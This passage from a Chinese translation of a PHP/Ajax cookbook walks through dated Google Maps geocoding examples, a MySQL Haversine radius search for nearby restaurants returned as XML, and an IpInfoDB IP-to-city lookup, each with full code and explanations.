该对象的第一个参数是要显示地图的容器的 DOM 对象，第二个参数是我们之前在`map_options`对象中定义的地图选项。 

## 它是如何工作的...

现在让我们看看上述代码在网页上的 Google 地图是什么样子。这是尼泊尔加德满都中心点的卫星地图。这只是一个简单的 Google 地图，您可以使用缩放地图、拖动地图查看其他地方以及查看卫星、路线图或地形等不同类型的地图功能。

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_05.jpg)

# 在 Google 地图中搜索位置

在了解如何使用 Google 地图 JavaScript API 在网页中嵌入地图之后，现在让我们看一个简单的应用程序，使用 Google 地图 API 的`GeoCoder()`类在 Google 地图中搜索位置。

## 准备工作

这个工具有一个非常简单的应用程序和一个简单的界面。您可以在以下图像中查看其界面。它有一个简单的文本框，您可以在其中输入值。该值可以是世界上的任何位置、城市或地标。然后，Google API 的*geocoder*将找到该位置并指向它。如果找到该位置，地图将以我们搜索的位置为中心。在地图上找到的位置上会放置一个红色标记，这是 Google 地图 API 提供的默认标记。

### 注意

地理编码是将地址（如"619 Escuela Ave, Mountain View, CA"）转换为地理坐标系（37.394011，-122.095528）的过程，即纬度和经度。

当您单击红色标记时，会打开一个小信息窗口，显示 Google 地图 API 返回的完整地址位置，这是我们正在搜索的地方。

![准备工作](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_06.jpg)

## 如何做...

在了解了该应用程序的界面工作原理之后，让我们看看它的代码。我们在这个工具中使用了 Google 地图 API 的不同类。以下是您可以在源代码中的`example-6.html`中找到的列表的代码。

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<style type="text/css">
body { height: 100%; margin: 0px; padding: 0px }
#map { width:600px; height:500px; }
</style>
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false">
</script>
<script type="text/javascript">
//varaibles for map object, geocoder object, array of marker and information window
var map_obj;
var geocoder;
var temp_mark;
var infowindow;
function showmap() {
//longitude and latitude of Kathmandu, Nepal
var lat_lng = new google.maps.LatLng(27.702871,85.318244);
//options of map
var map_options = {
center: lat_lng,
zoom: 10,
mapTypeId: google.maps.MapTypeId.ROADMAP
};
//now map should be there
map_obj = new google.maps.Map(document.getElementById("map"), map_options);
}
function show_address_in_map()
{
geocoder = new google.maps.Geocoder();
var address = document.getElementById("address").value;
geocoder.geocode( { 'address': address}, function(results, status) {
if (status == google.maps.GeocoderStatus.OK) {
map_obj.setCenter(results[0].geometry.location);
//clear the old marker
if(temp_mark)
temp_mark.setMap(null);
//create a new marker on the searched position
var marker = new google.maps.Marker({
map: map_obj,
position: results[0].geometry.location
});
//assign the marker to another temporaray variable
temp_mark = marker;
//now add the info windows
infowindow = new google.maps.InfoWindow({content: results[0].formatted_address});
//now add the event listener to marker
google.maps.event.addListener(marker, 'click', function() {
infowindow.open(map_obj,marker);
});
} else {
alert("Google map could not find the address : " + status);
}
});
return false;
}
</script>
</head>
<body onload="showmap()">
<h3>Find location on google map</h3>
<form method="post" name="mapform" onsubmit="return show_address_in_map();" >
<strong>Address : </strong><input type="text" name="address" id="address" value="" /> <input name="find" value="Search" type="submit" />
</form>
<div id="map" ></div>
</body>
</html>

```

## 它是如何工作的...

在查看代码之后，现在让我们看看这个应用程序的代码是如何真正工作的。

```php
var map_obj;
var geocoder;
var temp_mark;
var infowindow;

```

在该应用程序中定义了四个全局 JavaScript 变量。一个是地图对象，另一个是 API 的地理编码器对象，下一个是一个临时变量，用于存储稍后清除的标记——`temp_mark`变量在这里有点棘手，您将看到它是如何用于从地图上清除标记的，因为 Google MAP v3 没有任何预定义的函数来清除地图上的标记。我们应用程序中定义的第四个全局变量用于存储信息窗口对象。在查看全局 JavaScript 变量之后，现在让我们看看从不同事件中调用的不同 JavaScript 函数。

```php
<body onload="showmap()">

```

正如您在前面的片段中清楚地看到的，当页面加载时调用`showmap()`函数。

```php
<form method="post" name="mapform" onsubmit="return show_address_in_map();" >

```

还有另一个函数`show_address_in_map()`，当我们尝试提交表单时调用该函数，并且该函数返回`false`值以防止提交表单，这将导致重新加载页面。

现在首先让我们看一下`show_map()`函数的细节；它与上一个使用 Google Maps 定义的`show_map()`函数非常相似。一些不同之处在于我们将`map_obj`变量从局部变量移动到全局变量。此外，我们在此应用程序中使用的地图类型是`ROADMAP`。

现在，让我们看一下另一个名为`show_address_in_map()`的函数的代码，当表单提交时调用该函数。

```php
geocoder = new google.maps.Geocoder();
var address = document.getElementById("address").value;

```

在代码的第一行，我们声明了`Geocoder()`类的对象。这是该应用程序的主要类之一；这个类的对象向服务器发送地理编码请求。在另一行中，我们将搜索地址的值分配给`address`变量。

```php
geocoder.geocode( { 'address': address}, function(results, status) {
if (status == google.maps.GeocoderStatus.OK) {
map_obj.setCenter(results[0].geometry.location);

```

在这里，我们使用`geocode`向服务器发送带有地址参数分配给`address`变量的请求。当有结果时，调用回调函数。这个函数有两个参数：

+   第一个是`GeocoderResult`对象的结果数组。

+   第二个参数是`GeocoderStatus`类的对象。

您可以从 Google 地图 API 页面[`code.google.com/apis/maps/documentation/javascript/reference.html#Geocoder`](http://code.google.com/apis/maps/documentation/javascript/reference.html#Geocoder)了解 Geocoder 类的更多细节。

在回调函数中，我们通过将其与变量`google.maps.GeocoderStatus.OK`进行比较来检查结果的状态，这意味着结果变量包含有效的地理编码器响应。

在下一行，我们使用`google.maps.Map`类的`setCenter()`方法将地图居中到`getcode()`方法返回的第一个结果的位置。

现在让我们看一下响应格式，即结果变量的格式，以了解代码的其余部分。这个格式清楚地解释了响应对象。

```php
results[]: { types[]: string, formatted_address: string, address_components[]: { short_name: string, long_name: string, types[]: string }, geometry: { location: LatLng, location_type: GeocoderLocationType viewport: LatLngBounds, bounds: LatLngBounds } }

```

`results[0].geometry.location`变量是`google.maps.LatLng`类型的对象，这是纬度和经度的组合。我们在这里使用`results[0]`变量，因为地理编码器返回的第一个结果是搜索地址的最相关结果。

现在，让我们进一步进行代码的另一部分：

```php
if(temp_mark)
temp_mark.setMap(null);
var marker = new google.maps.Marker({
map: map_obj,
position: results[0].geometry.location
});
temp_mark = marker;

```

在上面的代码清单中，我们首先检查`temp_marker`变量是否为空。如果此变量未设置或为空，则不采取任何操作。但如果它包含一个标记对象，则使用`setMap()`函数从地图中移除标记。`setMap()`函数基本上用于将标记分配给地图对象，但当它设置为`null`时，它会从地图中移除标记。

在下一行，我们在`map_obj`地图对象上创建标记对象，标记的位置将是地理编码服务返回的位置的第一个结果。

接下来，`temp_mark`变量被分配为为新的搜索结果清除标记而创建的标记对象，这样可以避免在地图上显示多个标记。

创建标记后，现在让我们将信息窗口附加到标记上：

```php
infowindow = new google.maps.InfoWindow({content: results[0].formatted_address});

```

上面的代码创建了信息窗口。信息窗口的内容设置为我们作为地理编码服务响应的格式化结果。

```php
google.maps.event.addListener(marker, 'click', function() {
infowindow.open(map_obj,marker);
});

```

在上面的代码中，我们将点击事件附加到标记上。当点击时，使用`open()`函数打开信息窗口。这个函数接受两个参数：第一个是地图对象，第二个是锚点对象，在我们的例子中，锚点对象是标记对象。

以下行用于警报弹出窗口，显示地址的信息和状态：

```php
else {
alert("Google map could not find the address : " + status);
}

```

# 在 Google 地图上搜索 XX 公里半径内的标记和信息窗口

在了解如何使用文本框在 Google 地图中找到位置后，现在让我们转向一个稍微复杂的应用程序，称为“餐厅查找应用程序”。这个应用程序简单但功能强大。当用户在文本框中输入一个地点时，应用程序会查找距离搜索位置指定公里数范围内的餐厅。我们将使用 Haversine 公式来计算圆形距离。您可以从这里了解更多信息：[`en.wikipedia.org/wiki/Haversine_formula`](http://en.wikipedia.org/wiki/Haversine_formula)。

现在，让我们看一下这个应用程序的细节以及如何创建它。

## 准备工作

在了解应用程序的外观之后，现在让我们看看所需的背景知识，比如 Haversine 公式和数据库结构以及这个应用程序所需的数据。

### 用于计算圆形距离的 Haversine 公式

在进入代码之前，让我们首先尝试了解如何使用 Haversine 公式来计算从一个地方到另一个地方的圆形距离，当我们有两个地方的经度和纬度时。如果您擅长数学，维基百科的 URL [`en.wikipedia.org/wiki/Haversine_formula`](http://en.wikipedia.org/wiki/Haversine_formula) 中有关于它的深入细节。为了更清楚地理解 Haversine 公式，请查看 URL：[`www.movable-type.co.uk/scripts/latlong.html`](http://www.movable-type.co.uk/scripts/latlong.html)。它还有 JavaScript 中的示例代码以及 Excel 中的公式。参考上述 URL，让我们看一下用于计算两个位置之间距离的 Excel 公式：

=6371*ACOS(SIN(RADIANS(lat1))*SIN(RADIANS(lat2))+COS(RADIANS(lat1))*COS(RADIANS(lat2))*COS(RADIANS(lon2)- RADIANS(lon1)))

### 注意

在上面的公式中，6371 是地球的半径（以公里为单位）。如果要以英里为单位计算距离，请将 6371 替换为 3959。还请注意，三角函数接受弧度而不是角度，因此在传递之前将角度转换为弧度。

现在，让我们尝试将其转换为 SQL 查询，因为这是我们将在这个应用程序中使用它来查找两个地方之间的距离的方式。

```php
SELECT ( 6371 * acos(sin( radians(lat1) ) * sin( radians( lat2 ) ) +cos( radians(lat1) ) * cos( radians( lat2 ) ) * cos( radians( lon2 ) - radians(lon1) ) ) ) ;

```

在这个公式中，`(lat1, lon1)`是一个地方的地理坐标，而`(lat2, lon2)`是另一个地方的坐标。

### 创建表

由于这个应用程序是基于数据库表的，现在让我们为这个应用程序创建表结构。以下是用于此应用程序的表的 SQL 代码：

```php
CREATE TABLE `restaurants` (
`id` int(11) NOT NULL AUTO_INCREMENT,
`name` varchar(60) NOT NULL,
`address` varchar(90) NOT NULL,
`lat` float(9,6) NOT NULL,
`lng` float(9,6) NOT NULL,
PRIMARY KEY (`id`)
) ENGINE=MyISAM;

```

让我们试着看一下我们为这个表使用的不同字段的细节：

+   id - 这是该表的主键字段。该字段的数据类型为整数，最大为 11 位数。`AUTO_INCREMENT`属性指定，如果在 INSERT 语句或查询中未指定该字段的值，则该字段的值将自动递增 1（与先前的最高值）。

+   name - 这是一个长度为 60 的 varchar 字段。该字段保存我们应用程序中餐厅的名称。如果您觉得 60 不够，请增加大小。

+   address - 这个字段是一个长度为 90 的 varchar 字段。该字段保存餐厅的地址。

+   lat - 这个字段保存特定餐厅位置的纬度值。我们已将该字段的数据类型指定为浮点类型，长度为（9,6），这意味着它可以保存小数点后 6 位精度的 9 位数字。因此，该字段的值范围从 999.999999 到 999.999999。由于当前 Google 地图 API 的缩放级别功能，我们不需要小数点后超过 6 位的精度。

+   lon - 这个字段保存餐厅位置的经度值。字段类型和字段长度与纬度相同，即浮点型和（9,6）。

在查看我们用于应用程序的表之后，让我们看一下我们用于此应用程序的样本数据。我们只使用了很少的数据，因为这只是用于测试目的。以下是创建餐馆样本数据的 SQL 语句：

```php
INSERT INTO `restaurants` (`id`, `name`, `address`, `lat`, `lng`) VALUES
(1, 'Big Bell Restaurant and Guest House', 'Bhaktapur Nepal', 27.681187, 85.433067),
(2, 'Summit Hotel', 'Kupondole, Lalitpur, Nepal', 27.690613, 85.319077),
(3, 'New York Cafe', 'Thapathali, Kathmandu, Nepal', 27.696995, 85.323196),
(4, 'Attic Restaurant & Bar', 'Lazimpat, Kathmandu, Nepal', 27.721615, 85.327316);

```

您可以在您喜欢的 MySQL 编辑器中执行上述 SQL 代码以插入数据。

在这个应用程序中，我们使用了用于示例目的的位置数据，并且已经提供了用于测试。如果您想使用更多数据测试示例，并且您知道地点但没有该地点的地理坐标数据，您可以借助 Google 地理编码 API 的帮助。

假设我们想知道名为“Thapathali, Kathmandu”的地点的纬度和经度；然后我们可以向 Google 地理编码 API 发送请求，请求 URL 如下：

[`maps.googleapis.com/maps/api/geocode/json?address=thapathali,kathmandu,Nepal&sensor=false`](http://maps.googleapis.com/maps/api/geocode/json?address=thapathali,kathmandu,Nepal&sensor=false)

其中：

+   URL 中的`json`是响应的格式；如果您希望以 XML 格式获得响应，则可以将`json`替换为`XML`。

+   `address`参数包含您要将地理编码为纬度和经度的位置的地址。

响应将以 JSON 格式返回，您可以轻松解析并使用它。

## 如何做...

首先，让我们看一下这个应用程序的界面。有一个文本框，用户输入位置。然后，使用 Google 地图 API 的地理编码服务和存储在 PHP 中的数据，我们将在我们的示例中找到搜索地点 10 公里半径内的距离。

![如何做...](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_07.jpg)

在查看了制作应用程序所需的一些背景知识之后，现在让我们看一下构建此应用程序的代码。

首先，让我们看一下`example-7.html`文件的代码。

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<title>Searching within XX km. radius of a place using Google map, PHP, Ajax and MySQL</title>
<style type="text/css">
body {
height: 100%;
margin: 0px; padding: 0px;
}
#map {
width:600px;
height:500px;
}
</style>
<script type="text/javascript" src="https://Ajax.googleapis.com/Ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false">
</script>
<script type="text/javascript">
//global variables
var map_obj;
var geocoder;
var info_window = new google.maps.InfoWindow;
var markers_arr = [];
function showmap() {
//longitude and latitude of Kathmandu, Nepal
var lat_lng = new google.maps.LatLng(27.702871,85.318244);
//options of map
var map_options = {
center: lat_lng,
zoom: 11,
mapTypeId: google.maps.MapTypeId.ROADMAP
};
//now map should be there
map_obj = new google.maps.Map(document.getElementById("map"), map_options);
}
function search_map()
{
//initialize geocoding variable
geocoder = new google.maps.Geocoder();
var address = document.getElementById("address").value;
//start geocoding the address
geocoder.geocode( { 'address': address}, function(results, status) {
if (status == google.maps.GeocoderStatus.OK){
map_obj.setCenter(results[0].geometry.location);
//call the function to show the result with markers
search_near_by(results[0].geometry.location);
//clear all the markers
clear_markers ();
} else {
alert("Google API could not find the address : " + status);
}
});
return false;
}
function search_near_by(lat_lng)
{
//for the URL for the Ajax call
var url = 'restaurant-result.php?lat=' + lat_lng.lat() + '&lng=' + lat_lng.lng();
//use jQuery's get Ajax function to make the call
jQuery.get(url, function(data) {
//documentElement returns the root node of the xml
var markers = data.documentElement.getElementsByTagName('marker');
//looping through the each xml node
for (var i = 0; i < markers.length; i++) {
var name = markers[i].getAttribute('name');
var address = markers[i].getAttribute('address');
var distance = parseFloat(markers[i].getAttribute('distance'));
//create new LatLng object
var point = new google.maps.LatLng(parseFloat(markers[i].getAttribute('lat')),
parseFloat(markers[i].getAttribute('lng')));
//now call the function to create the markers and information window
create_marker(point, name, address, distance);
}
});
}
function create_marker(point, name, address, distance) {
//formatting html for displaying in information window
var html = '<strong>' + name + '</strong> <br/>' + address+'<br/>Distance :'+distance+' km';
//now create a marker object
var marker = new google.maps.Marker({
map: map_obj,
position: point
});
//now push into another array for clearing markers later on
markers_arr.push(marker);
//now bind the event on the click of the market
google.maps.event.addListener(marker, 'click', function() {
info_window.setContent(html);
info_window.open(map_obj,marker);
});
}
//function to clear the markers
function clear_markers () {
if (markers_arr) {
for (i in markers_arr) {
markers_arr[i].setMap(null);
}
}
//assign to empty array
markers_arr = [];
}
</script>
</head>
<body onload="showmap()">
<h3>Searching within XX km. radius of a place using Google map, PHP, Ajax and MySQL</h3>
<form method="post" name="mapform" onsubmit="return search_map();" >
<strong>Address : </strong><input type="text" name="address" id="address" value="" /> <input name="find" value="Search" type="submit" />
</form>
<div id="map" ></div>
</body>
</html>

```

在查看了这个示例之后，现在让我们看一下从`search_near_by()`函数提交纬度和经度时从 Ajax 调用的`restaurant-result.php`文件的代码：

```php
<?php
////default mysql connection
define('DB_SERVER','localhost');
define('DB_USER','root');
define('DB_PASS','');
define('DB_NAME','test');
//default value of radius it is 10 kilometer here
define('RADIUS',10);
//connect to mysql database
$conn=mysql_connect (DB_SERVER,DB_USER,DB_PASS);
if (!$conn) {
die("Connection failed : " . mysql_error());
}
// Select the database the active mySQL database, change your setting here as needed
$db_selected = mysql_select_db(DB_NAME, $conn);
if (!$db_selected) {
die ("Can\'t use db : " . mysql_error());
}
//now get the the longitude and latitude
$g_lat = $_GET["lat"];
$g_lng = $_GET["lng"];
//query to get the restaurants within specified kilometers
$query = sprintf("SELECT address, name, lat, lng, ( 6371 * acos( cos( radians('%s') ) * cos( radians( lat ) ) * cos( radians( lng ) - radians('%s') ) + sin( radians('%s') ) * sin( radians( lat ) ) ) ) AS distance FROM restaurants HAVING distance < '%s' ORDER BY distance LIMIT 0 , 10",
mysql_real_escape_string($g_lat),
mysql_real_escape_string($g_lng),
mysql_real_escape_string($g_lat),
RADIUS
);
//get mysql result
$result = mysql_query($query);
//we're sending reponse in xml format
header("Content-type: text/xml");
// parent node of xml file
echo '<markers>';
// Iterate through the result rows
while ($row = @mysql_fetch_assoc($result)){
// add attribute to xml node called marker
echo '<marker ';
echo 'name="' . htmlentities($row['name'],ENT_QUOTES) . '" ';
echo 'address="' . htmlentities($row['address'],ENT_QUOTES) . '" ';
echo 'lat="' . $row['lat'] . '" ';
echo 'lng="' . $row['lng'] . '" ';
echo 'distance="' . $row['distance'] . '" ';
echo '/>';
}
// closing tag for parent node
echo '</markers>';
?>

```

## 它是如何工作的...

在查看代码之后，让我们试着理解这个应用程序的代码是如何工作的。首先，让我们试着理解`restaurant-result.php`的代码。

```php
define('RADIUS',10);

```

在上述行中，RADIUS 变量定义为 10，这意味着我们正在搜索半径为 10 公里的区域内的位置。您可以根据需要在这里更改值。

```php
//now get the the longitude and latitude
$g_lat = $_GET["lat"];
$g_lng = $_GET["lng"];
$query = sprintf("SELECT address, name, lat, lng, ( 6371 * acos( cos( radians('%s') ) * cos( radians( lat ) ) * cos( radians( lng ) - radians('%s') ) + sin( radians('%s') ) * sin( radians( lat ) ) ) ) AS distance FROM restaurants HAVING distance < '%s' ORDER BY distance LIMIT 0 , 10",
mysql_real_escape_string($g_lat),
mysql_real_escape_string($g_lng),
mysql_real_escape_string($g_lat),
RADIUS
);

```

在上述代码的前两行中，我们从 Ajax 调用中获取纬度和经度的值。之后，我们创建 SQL 查询，以查找距离搜索位置 10 公里范围内的位置。还要注意，我们从 SQL 查询中获取前 10 个结果。

现在，让我们看一下如何创建 XML 格式，以便稍后用于创建标记。

```php
echo '<markers>';
while ($row = @mysql_fetch_assoc($result)){
echo '<marker ';
echo 'name="' . htmlentities($row['name'],ENT_QUOTES) . '" ';
echo 'address="' . htmlentities($row['address'],ENT_QUOTES) . '" ';
echo 'lat="' . $row['lat'] . '" ';
echo 'lng="' . $row['lng'] . '" ';
echo 'distance="' . $row['distance'] . '" ';
echo '/>';
}
echo '</markers>';

```

在创建 XML 时，我们使用`htmlentities()`函数将特殊字符如`<, >`转换为 HTML 实体，如`&gt, &lt`等，以避免 XML 数据因这些特殊字符而变形。

让我们通过在浏览器上调用此函数来查看`restaurant-result.php`脚本生成的 XML 输出，如`restaurant-result.php?lat=27.6862181&lng=85.31491419999998`，其中指定的纬度和经度属于位置'Kupondole, Lalitpur, Nepal'：

```php
<markers>
<marker name="Summit Hotel" address="Kupondole, Lalitpur, Nepal" lat="27.690613" lng="85.319077" distance="0.6377753814621" />
<marker name="New York Cafe" address="Thapathali, Kathmandu, Nepal" lat="27.696995" lng="85.323196" distance="1.44945592535556" />
<marker name="Attic Restaurant &amp; Bar" address="Lazimpat, Kathmandu, Nepal" lat="27.721615" lng="85.327316" distance="4.12096367652591" />
</markers>

```

在查看了 PHP 代码和已关闭餐馆的 XML 输出之后，现在让我们看一下`example-7.html`文件中的 JavaScript 代码。

首先，让我们先看一下`search_map()`函数的代码。

```php
function search_map()
{
geocoder = new google.maps.Geocoder();
var address = document.getElementById("address").value;
geocoder.geocode( { 'address': address}, function(results, status) {
if (status == google.maps.GeocoderStatus.OK){
map_obj.setCenter(results[0].geometry.location);
search_near_by(results[0].geometry.location);
clearOverlays();
} else {
alert("Google API could not find the address : " + status);
}
});
return false;
}

```

在这个`search_map()`函数中，我们使用 Google Map API 的地理编码功能，使用`geocode()`函数将地址转换为纬度和经度。如果找到地址并且地理编码结果成功返回，地图将使用`setCenter()`函数居中到找到的第一个位置。然后，使用参数`results[0].geometry.location`调用`search_near_by()`函数，这个对象保存了从搜索地址中最接近的位置的纬度和经度值。

现在，首先让我们看一下`search_near_by()`函数的前两行：

```php
function search_near_by(lat_lng)
{
var url = 'restaurant-result.php?lat=' + lat_lng.lat() + '&lng=' + lat_lng.lng();
jQuery.get(url, function(data) {

```

正如你清楚地看到的，我们正在使用 jQuery 的`get`函数向`restaurant-result.php`发送 Ajax 请求，使用`get`方法发送 Ajax 请求。

`data`变量包含了从服务器端响应返回的最近找到的餐馆信息的 XML 响应。

现在，让我们看看 JavaScript 中`search_near_by()`函数中如何解析 XML 响应。

```php
var markers = data.documentElement.getElementsByTagName('marker');
for (var i = 0; i < markers.length; i++) {
var name = markers[i].getAttribute('name');
var address = markers[i].getAttribute('address');
var distance = parseFloat(markers[i].getAttribute('distance'));
var point = new google.maps.LatLng(parseFloat(markers[i].getAttribute('lat')),
parseFloat(markers[i].getAttribute('lng')));
create_marker(point, name, address, distance);
}

```

在上面的代码中，`data.documentElement`指的是数据对象的根节点。`markers`变量包含了通过`getElemementByTagName()` DOM 函数返回的名为 marker 的节点。

在循环中遍历每个 XML 节点之后，我们调用了`create_marker()`函数来创建从 XML 返回的每个位置的标记。请注意，`point`变量是`LatLng`类的对象，因为`marker`类需要它来创建标记。

现在，让我们看一下创建标记的函数，它创建标记和信息窗口：

```php
function create_marker(point, name, address,distance) {
var html = '<strong>' + name + '</strong> <br/>' + address+'<br/>Distance :'+distance+'km';
var marker = new google.maps.Marker({
map: map_obj,
position: point
});
markers_arr.push(marker);
google.maps.event.addListener(marker, 'click', function() {
info_window.setContent(html);
info_window.open(map_obj,marker);
});
}

```

在这个函数中，首先我们创建一个 HTML 格式来显示在信息窗口上。之后我们创建一个标记对象，并将这个标记对象推入`markers_arr`变量中。我们将使用`markers_arr`临时存储`marker`对象，以便在下一个位置搜索时从地图上清除。因此，我们为标记附加了一个点击事件，以显示提供的内容的信息窗口。

现在，让我们更仔细地看一下从`search_map()`中调用的`clear_marker()`函数。

```php
function clear_markers() {
if (markers_arr) {
for (i in markers_arr) {
markers_arr[i].setMap(null);
}
}
markers_arr = [];
}

```

在上面的函数中，`markers_arr`是一个全局数组变量，它包含了从`create_markers()`函数中的语句`markers_arr.push(marker)`存储的`marker`对象。每个标记都使用`setMap()`函数和空参数从地图上移除。最后，全局变量`markers_arr`被赋予一个空数组，以节省一些内存。

# 使用 IP 地址查找城市/国家

在这一部分，我们将把 IP 地址转换成城市和国家名称。我们将使用[`www.ipinfodb.com/`](http://www.ipinfodb.com/)的 API 来从 IP 地址获取城市和国家的名称。

## 准备工作

IpInfodb.com 是一个流行的网络服务，使用其 RESTful API 提供 IP 到国家和城市信息。

要使用这个功能，首先需要在网站上注册并获取访问密钥。一旦获得了 API 密钥，就可以进行调用。现在，让我们了解如何调用网站的 API。可以使用以下 Restful API 调用 API：

[`api.ipinfodb.com/v3/ip-city/?format=xml&key=<yourkey>&ip=<your ip>`](http://api.ipinfodb.com/v3/ip-city/?format=xml&key=<yourkey>&ip=<your)

其中格式值可以是 XML 或 JSON。

现在，在查看请求 API 调用之后，让我们看一下对 IP 地址 128.88.69.78 的 API 调用的响应。

**<Response>**

**<statusCode>OK</statusCode>**

**<statusMessage/>**

**<ipAddress>128.88.69.78</ipAddress>**

**<countryCode>US</countryCode>**

**<countryName>UNITED STATES</countryName>**

**<regionName>加利福尼亚</regionName>**

**<cityName>帕洛阿尔托</cityName>**

**<zipCode>94304</zipCode>**

**<latitude>37.4404</latitude>**

**<longitude>-122.14</longitude>**

**<timeZone>-08:00</timeZone>**

**</Response>**

响应包含有关 IP 地址所属的地理信息。

### 注意

由于 IP 地址是从现有数据库中查找的等因素，API 的响应可能不会 100%准确。此外，保留 IP 的响应，如 127.0.0.1，可能不会导致任何特定结果。

## 如何做...

在查看了 IpInfodb 的 API 信息之后，现在让我们看一下我们应用的界面。它有一个文本框，您可以在其中输入 IP 地址，并以以下格式显示 IP 地址的地理位置：

城市名称，地区/州/省名称，国家名称

![如何做...](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_08.jpg)

现在，让我们看一下构建此应用程序的代码，以查找 IP 地址的位置。

首先，让我们看一下`example-8.html`文件的代码。

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Country and City name by IP address</title>
<style type="text/css">
body{
font-family:Arial, Helvetica, sans-serif;
}
</style>
<script type="text/javascript" src="https://Ajax.googleapis.com/Ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript">
$('document').ready(function()
{
$('#Ajaxipform').submit(function()
{
//get the value of the search ip address
var ip = $('#ip_addr').val();
//shows the please wait until result is fetched
$("#result").html('Please wait....');
$.Ajax({
url : 'ip.php',
data : 'ip='+ip,
dataType : 'json',
success : function(data)
{
//check if it is valid ip or not
if($.trim(data.errormsg)=='')
{
var text = data.city+', '+data.region+', '+data.country;
$('#result').html(text);
}
else
{
$('#result').html(data.errormsg);
}
}
});
//to protect from reloading the page
return false;
});
});
</script>
</head>
<body>
<h3>Find Country and City name by IP address using Ajax</h3>
<form method="post" name="Ajaxipform" id="Ajaxipform" >
IP Address: <input type="text" name="ip_addr" id="ip_addr" value="" />
<input name="findip" value="Search" type="submit" />
</form>
<br />
<div id="result"></div>
</body>
</html>

```

如上所示的代码中，有一个对`ip.php`的 Ajax 调用。让我们来看一下`ip.php`文件的 PHP 代码：

```php
<?php
//key of the ipinfodb
define('KEY','You key goes here');
//the value of ip address
$ip = $_GET['ip'];
//filter_var function is avaiable in PHP 5.2 or greater only
if(!filter_var($ip, FILTER_VALIDATE_IP))
{
$return_array = array('errormsg'=>'Invalid IP, please try again');
}
else
{
//for the api call
$ipdbinfo_url = sprintf( 'http://api.ipinfodb.com/v3/ip-city/?format=xml&key=%s&ip=%s',KEY,$ip);
//get the xml content
$ipxml = file_get_contents($ipdbinfo_url);
//parse the xml string
$xml = simplexml_load_string($ipxml);
if($xml->statusCode=='OK')
$return_array = array('errormsg'=>'',
'city'=>strval($xml->cityName),
'country'=>strval($xml->countryName),
'region'=>strval($xml->regionName));
else
$return_array = array('errormsg'=>'API ERROR');
}
//echo the json encoded string
echo json_encode($return_array);
?>

```

## 它是如何工作的...

在查看了两个文件`example-8.html`和`ip.php`的代码之后，现在让我们深入了解第一个文件的代码。让我们看一下从 Ajax 调用的`ip.php`的 PHP 代码：

```php
$ip = $_GET['ip'];
if(!filter_var($ip, FILTER_VALIDATE_IP))
{
$return_array = array('errormsg'=>'Invalid IP, please try again');
}

```

如上所示，我们使用`filter_var()`与`FILTER_VALIDATEIP`常量一起验证变量`$ip`的 IP 地址值是否为有效的 IP 地址格式。这个函数是在 PHP 5.2 中引入的，是一个强大的验证函数之一。您可以从此 URL 找到更多关于此函数可用的其他过滤器常量的信息：[`www.php.net/manual/en/filter.filters.php`](http://www.php.net/manual/en/filter.filters.php)。如果 IP 地址不是有效的 IP 地址，则将错误消息分配给返回数组的`errormsg`键。

现在，让我们看一下 IP 地址有效时的 API 调用：

```php
$ipdbinfo_url = sprintf( 'http://api.ipinfodb.com/v3/ip-city/?format=xml&key=%s&ip=%s',KEY,$ip);
$ipxml = file_get_contents($ipdbinfo_url);
$xml = simplexml_load_string($ipxml);

```

在上述代码中，首先我们正在构建字符串以形成请求，然后使用`file_get_contents()`进行调用。然后将 XML 响应传递给`simplexml_load_string()`函数进行解析，它将 XML 数据解析为 PHP 的 SimpleXML 对象。

### 注意

SimpleXML 解析器是在 PHP 5 中引入的，要使用`simplexml_load_string()`之类的函数，需要在 PHP 中安装 SimpleXML 扩展。

```php
if($xml->statusCode=='OK')
$return_array = array('errormsg'=>'',
'city'=>strval($xml->cityName),
'country'=>strval($xml->countryName),
'region'=>strval($xml->regionName));
else
$return_array = array('errormsg'=>'API ERROR');

```

现在，在这里，我们正在检查响应值`statusCode`节点，并根据其值形成`$return_array`中的 Ajax 响应。

现在，我们不能直接将`$return_array`传递给 JavaScript，因为它是 PHP 中的一个数组。它应该转换为 JSON 对象，以便 JavaScript 可以轻松访问，因此在最后一行，我们使用了 PHP 的`json_encode()`函数将此数组编码为 JSON。

```php
echo json_encode($return_array);

```

现在，让我们使用有效的 IP 地址调用`ip.php`并查看响应。例如，调用

`ip.php?ip=78.41.205.188`，您将获得如下所示的 JSON 响应：

**{"errormsg":"","city":"AMSTERDAM","country":"NETHERLANDS","region":"NOORD-HOLLAND"}**

现在，让我们看一下我们在`example-8.php`中使用的 Ajax 调用。

```php
$.Ajax({
url : 'ip.php',
data : 'ip='+ip,
dataType : 'json',
success : function(data)
{
if($.trim(data.errormsg)=='')
{
var text = data.city+', '+data.region+', '+data.country;
$('#result').html(text);
}
else
{
$('#result').html(data.errormsg);
}
}
});

```

如您在上述 Ajax 函数中所见，我们正在查看 JSON 响应，该响应在`data`变量中。首先，我们通过检查`data.errormsg`变量来检查是否有错误消息。如果有错误，我们将直接在 ID 为`result`的 div 中显示它。

如果没有错误消息，则`data.city, data.region`和`data.country`变量中有值，并形成字符串以在 ID 为`result`的 div 中显示位置信息。

# 使用 Ajax 和 PHP 转换货币

